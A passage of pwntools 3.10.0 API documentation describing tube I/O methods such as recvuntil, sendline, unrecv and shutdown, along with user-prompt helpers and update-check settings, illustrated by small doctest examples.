<p>By default <code class="xref py py-func docutils literal"><span class="pre">re.RegexObject.search()</span></code> is used, but if <cite>exact</cite> is
set to True, then <code class="xref py py-func docutils literal"><span class="pre">re.RegexObject.match()</span></code> will be used instead.</p>
<p>If the request is not satisfied before <code class="docutils literal"><span class="pre">timeout</span></code> seconds pass,
all data is buffered and an empty string (<code class="docutils literal"><span class="pre">''</span></code>) is returned.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.recvrepeat">
<code class="descname">recvrepeat</code><span class="sig-paren">(</span><em>timeout = default</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L624-654"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.recvrepeat" title="Permalink to this definition">¶</a></dt>
<dd><p>Receives data until a timeout or EOF is reached.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">data</span> <span class="o">=</span> <span class="p">[</span>
<span class="gp">... </span><span class="s1">&#39;d&#39;</span><span class="p">,</span>
<span class="gp">... </span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="c1"># simulate timeout</span>
<span class="gp">... </span><span class="s1">&#39;c&#39;</span><span class="p">,</span>
<span class="gp">... </span><span class="s1">&#39;b&#39;</span><span class="p">,</span>
<span class="gp">... </span><span class="s1">&#39;a&#39;</span><span class="p">,</span>
<span class="gp">... </span><span class="p">]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">def</span> <span class="nf">delayrecv</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">):</span>
<span class="gp">... </span>    <span class="k">return</span> <span class="n">data</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv_raw</span> <span class="o">=</span> <span class="n">delayrecv</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
<span class="go">&#39;abc&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="go">&#39;d&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.recvuntil">
<code class="descname">recvuntil</code><span class="sig-paren">(</span><em>delims</em>, <em>timeout = default</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L246-333"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.recvuntil" title="Permalink to this definition">¶</a></dt>
<dd><p>Receive data until one of <cite>delims</cite> is encountered.</p>
<p>If the request is not satisfied before <code class="docutils literal"><span class="pre">timeout</span></code> seconds pass,
all data is buffered and an empty string (<code class="docutils literal"><span class="pre">''</span></code>) is returned.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>delims</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a><em>,</em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#tuple" title="(in Python v2.7)"><em>tuple</em></a>) &#8211; String of delimiters characters, or list of delimiter strings.</li>
<li><strong>drop</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Drop the ending.  If <code class="xref py py-const docutils literal"><span class="pre">True</span></code> it is removed from the end of the return value.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Raises:</th><td class="field-body"><p class="first"><a class="reference external" href="https://docs.python.org/2.7/library/exceptions.html#exceptions.EOFError" title="(in Python v2.7)"><code class="xref py py-exc docutils literal"><span class="pre">exceptions.EOFError</span></code></a> &#8211; The connection closed before the request could be satisfied</p>
</td>
</tr>
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A string containing bytes received from the socket,
or <code class="docutils literal"><span class="pre">''</span></code> if a timeout occurred while waiting.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv_raw</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">n</span><span class="p">:</span> <span class="s2">&quot;Hello World!&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
<span class="go">&#39;Hello &#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span><span class="o">=</span><span class="n">t</span><span class="o">.</span><span class="n">clean</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="c1"># Matches on &#39;o&#39; in &#39;Hello&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="nb">tuple</span><span class="p">(</span><span class="s1">&#39; Wor&#39;</span><span class="p">))</span>
<span class="go">&#39;Hello&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span><span class="o">=</span><span class="n">t</span><span class="o">.</span><span class="n">clean</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="c1"># Matches expressly full string</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39; Wor&#39;</span><span class="p">)</span>
<span class="go">&#39;Hello Wor&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span><span class="o">=</span><span class="n">t</span><span class="o">.</span><span class="n">clean</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="c1"># Matches on full string, drops match</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39; Wor&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="go">&#39;Hello&#39;</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="c1"># Try with regex special characters</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv_raw</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">n</span><span class="p">:</span> <span class="s2">&quot;Hello|World&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="go">&#39;Hello&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.send">
<code class="descname">send</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L678-707"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.send" title="Permalink to this definition">¶</a></dt>
<dd><p>Sends data.</p>
<p>If log level <code class="docutils literal"><span class="pre">DEBUG</span></code> is enabled, also prints out the data
received.</p>
<p>If it is not possible to send anymore because of a closed
connection, it raises <code class="docutils literal"><span class="pre">exceptions.EOFError</span></code></p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span> <span class="nb">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">send_raw</span> <span class="o">=</span> <span class="n">p</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;hello&#39;</span><span class="p">)</span>
<span class="go">&#39;hello&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.sendafter">
<code class="descname">sendafter</code><span class="sig-paren">(</span><em>delim</em>, <em>data</em>, <em>timeout = default</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L732-740"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.sendafter" title="Permalink to this definition">¶</a></dt>
<dd><p>A combination of <code class="docutils literal"><span class="pre">recvuntil(delim,</span> <span class="pre">timeout)</span></code> and <code class="docutils literal"><span class="pre">send(data)</span></code>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.sendline">
<code class="descname">sendline</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L709-726"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.sendline" title="Permalink to this definition">¶</a></dt>
<dd><p>Shorthand for <code class="docutils literal"><span class="pre">t.send(data</span> <span class="pre">+</span> <span class="pre">t.newline)</span></code>.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span> <span class="nb">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">send_raw</span> <span class="o">=</span> <span class="n">p</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;hello&#39;</span><span class="p">)</span>
<span class="go">&#39;hello\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">newline</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;hello&#39;</span><span class="p">)</span>
<span class="go">&#39;hello\r\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.sendlineafter">
<code class="descname">sendlineafter</code><span class="sig-paren">(</span><em>delim</em>, <em>data</em>, <em>timeout = default</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L742-749"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.sendlineafter" title="Permalink to this definition">¶</a></dt>
<dd><p>A combination of <code class="docutils literal"><span class="pre">recvuntil(delim,</span> <span class="pre">timeout)</span></code> and <code class="docutils literal"><span class="pre">sendline(data)</span></code>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.sendlinethen">
<code class="descname">sendlinethen</code><span class="sig-paren">(</span><em>delim</em>, <em>data</em>, <em>timeout = default</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L759-765"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.sendlinethen" title="Permalink to this definition">¶</a></dt>
<dd><p>A combination of <code class="docutils literal"><span class="pre">sendline(data)</span></code> and <code class="docutils literal"><span class="pre">recvuntil(delim,</span> <span class="pre">timeout)</span></code>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.sendthen">
<code class="descname">sendthen</code><span class="sig-paren">(</span><em>delim</em>, <em>data</em>, <em>timeout = default</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L751-757"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.sendthen" title="Permalink to this definition">¶</a></dt>
<dd><p>A combination of <code class="docutils literal"><span class="pre">send(data)</span></code> and <code class="docutils literal"><span class="pre">recvuntil(delim,</span> <span class="pre">timeout)</span></code>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.settimeout">
<code class="descname">settimeout</code><span class="sig-paren">(</span><em>timeout</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L1083-1099"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.settimeout" title="Permalink to this definition">¶</a></dt>
<dd><p>Set the timeout for receiving operations. If the string &#8220;default&#8221;
is given, then <code class="xref py py-data docutils literal"><span class="pre">context.timeout</span></code> will be used. If None is given,
then there will be no timeout.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">settimeout_raw</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">t</span><span class="p">:</span> <span class="kc">None</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">timeout</span> <span class="o">==</span> <span class="mi">3</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.shutdown">
<code class="descname">shutdown</code><span class="sig-paren">(</span><em>direction = &quot;send&quot;</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L1114-1149"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.shutdown" title="Permalink to this definition">¶</a></dt>
<dd><p>Closes the tube for futher reading or writing depending on <cite>direction</cite>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>direction</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Which direction to close; &#8220;in&#8221;, &#8220;read&#8221; or &#8220;recv&#8221;
closes the tube in the ingoing direction, &#8220;out&#8221;, &#8220;write&#8221; or &#8220;send&#8221;
closes it in the outgoing direction.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><code class="xref py py-const docutils literal"><span class="pre">None</span></code></td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span> <span class="nb">print</span> <span class="n">x</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">shutdown_raw</span> <span class="o">=</span> <span class="n">p</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span><span class="o">=</span><span class="nb">map</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">shutdown</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;in&#39;</span><span class="p">,</span> <span class="s1">&#39;read&#39;</span><span class="p">,</span> <span class="s1">&#39;recv&#39;</span><span class="p">,</span> <span class="s1">&#39;out&#39;</span><span class="p">,</span> <span class="s1">&#39;write&#39;</span><span class="p">,</span> <span class="s1">&#39;send&#39;</span><span class="p">))</span>
<span class="go">recv</span>
<span class="go">recv</span>
<span class="go">recv</span>
<span class="go">send</span>
<span class="go">send</span>
<span class="go">send</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">shutdown</span><span class="p">(</span><span class="s1">&#39;bad_value&#39;</span><span class="p">)</span> 
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">KeyError</span>: <span class="n">&quot;direction must be in [&#39;in&#39;, &#39;out&#39;, &#39;read&#39;, &#39;recv&#39;, &#39;send&#39;, &#39;write&#39;]&quot;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.spawn_process">
<code class="descname">spawn_process</code><span class="sig-paren">(</span><em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L996-1007"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.spawn_process" title="Permalink to this definition">¶</a></dt>
<dd><p>Spawns a new process having this tube as stdin, stdout and stderr.</p>
<p>Takes the same arguments as <a class="reference external" href="https://docs.python.org/2.7/library/subprocess.html#subprocess.Popen" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">subprocess.Popen</span></code></a>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.stream">
<code class="descname">stream</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L819-846"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.stream" title="Permalink to this definition">¶</a></dt>
<dd><p>Receive data until the tube exits, and print it to stdout.</p>
<p>Similar to <a class="reference internal" href="#pwnlib.tubes.tube.tube.interactive" title="pwnlib.tubes.tube.tube.interactive"><code class="xref py py-func docutils literal"><span class="pre">interactive()</span></code></a>, except that no input is sent.</p>
<p>Similar to <code class="docutils literal"><span class="pre">print</span> <span class="pre">tube.recvall()</span></code> except that data is printed
as it is received, rather than after all data is received.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>line_mode</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Whether to receive line-by-line or raw data.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">All data printed.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.timeout_change">
<code class="descname">timeout_change</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L1239-1250"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.timeout_change" title="Permalink to this definition">¶</a></dt>
<dd><p>Informs the raw layer of the tube that the timeout has changed.</p>
<p>Should not be called directly.</p>
<p>Inherited from <code class="xref py py-class docutils literal"><span class="pre">Timeout</span></code>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.unrecv">
<code class="descname">unrecv</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L80-100"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.unrecv" title="Permalink to this definition">¶</a></dt>
<dd><p>Puts the specified data back at the beginning of the receive
buffer.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv_raw</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">n</span><span class="p">:</span> <span class="s1">&#39;hello&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="go">&#39;hello&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="go">&#39;hello&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">unrecv</span><span class="p">(</span><span class="s1">&#39;world&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="go">&#39;world&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="go">&#39;hello&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.wait">
<code class="descname">wait</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L1053-1057"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.wait" title="Permalink to this definition">¶</a></dt>
<dd><p>Waits until the tube is closed.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.tube.tube.wait_for_close">
<code class="descname">wait_for_close</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py#L1053-1057"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.wait_for_close" title="Permalink to this definition">¶</a></dt>
<dd><p>Waits until the tube is closed.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.tube.tube.newline">
<code class="descname">newline</code><em class="property"> = '\n'</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/tube.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.tube.tube.newline" title="Permalink to this definition">¶</a></dt>
<dd><p>Delimiter to use for <a class="reference internal" href="#pwnlib.tubes.tube.tube.sendline" title="pwnlib.tubes.tube.tube.sendline"><code class="xref py py-meth docutils literal"><span class="pre">sendline()</span></code></a>, <a class="reference internal" href="#pwnlib.tubes.tube.tube.recvline" title="pwnlib.tubes.tube.tube.recvline"><code class="xref py py-meth docutils literal"><span class="pre">recvline()</span></code></a>,
and related functions.</p>
</dd></dl>

</dd></dl>

</div>
</div>
<span id="document-ui"></span><div class="section" id="module-pwnlib.ui">
<span id="pwnlib-ui-functions-for-user-interaction"></span><h3><a class="reference internal" href="#module-pwnlib.ui" title="pwnlib.ui"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.ui</span></code></a> &#8212; Functions for user interaction<a class="headerlink" href="#module-pwnlib.ui" title="Permalink to this headline">¶</a></h3>
<dl class="function">
<dt id="pwnlib.ui.more">
<code class="descclassname">pwnlib.ui.</code><code class="descname">more</code><span class="sig-paren">(</span><em>text</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/ui.py#L168-192"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.ui.more" title="Permalink to this definition">¶</a></dt>
<dd><p>Shows text like the command line tool <code class="docutils literal"><span class="pre">more</span></code>.</p>
<p>It not in term_mode, just prints the data to the screen.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>text</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The text to show.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><code class="xref py py-const docutils literal"><span class="pre">None</span></code></td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.ui.options">
<code class="descclassname">pwnlib.ui.</code><code class="descname">options</code><span class="sig-paren">(</span><em>prompt</em>, <em>opts</em>, <em>default=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/ui.py#L63-147"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.ui.options" title="Permalink to this definition">¶</a></dt>
<dd><p>Presents the user with a prompt (typically in the
form of a question) and a number of options.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>prompt</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The prompt to show</li>
<li><strong>opts</strong> (<a class="reference internal" href="index.html#pwnlib.protocols.adb.AdbClient.list" title="pwnlib.protocols.adb.AdbClient.list"><em>list</em></a>) &#8211; The options to show to the user</li>
<li><strong>default</strong> &#8211; The default option to choose</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The users choice in the form of an integer.</p>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.ui.pause">
<code class="descclassname">pwnlib.ui.</code><code class="descname">pause</code><span class="sig-paren">(</span><em>n=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/ui.py#L149-166"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.ui.pause" title="Permalink to this definition">¶</a></dt>
<dd><p>Waits for either user input or a specific number of seconds.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.ui.yesno">
<code class="descclassname">pwnlib.ui.</code><code class="descname">yesno</code><span class="sig-paren">(</span><em>prompt</em>, <em>default=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/ui.py#L11-61"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.ui.yesno" title="Permalink to this definition">¶</a></dt>
<dd><p>Presents the user with prompt (typically in the form of question) which
the user must answer yes or no.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>prompt</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The prompt to show</li>
<li><strong>default</strong> &#8211; The default option;  <cite>True</cite> means &#8220;yes&#8221;</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last"><cite>True</cite> if the answer was &#8220;yes&#8221;, <cite>False</cite> if &#8220;no&#8221;</p>
</td>
</tr>
</tbody>
</table>
</dd></dl>

</div>
<span id="document-update"></span><div class="section" id="module-pwnlib.update">
<span id="pwnlib-update-updating-pwntools"></span><h3><a class="reference internal" href="#module-pwnlib.update" title="pwnlib.update"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.update</span></code></a> &#8212; Updating Pwntools<a class="headerlink" href="#module-pwnlib.update" title="Permalink to this headline">¶</a></h3>
<p># Pwntools Update</p>
<p>In order to ensure that Pwntools users always have the latest and
greatest version, Pwntools automatically checks for updates.</p>
<p>Since this update check takes a moment, it is only performed once
every week.  It can be permanently disabled via:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>$ <span class="nb">echo</span> never &gt; ~/.pwntools-cache/update
</pre></div>
</div>
<dl class="function">
<dt id="pwnlib.update.available_on_pypi">
<code class="descclassname">pwnlib.update.</code><code class="descname">available_on_pypi</code><span class="sig-paren">(</span><em>prerelease=False</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/update.py#L39-54"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.update.available_on_pypi" title="Permalink to this definition">¶</a></dt>
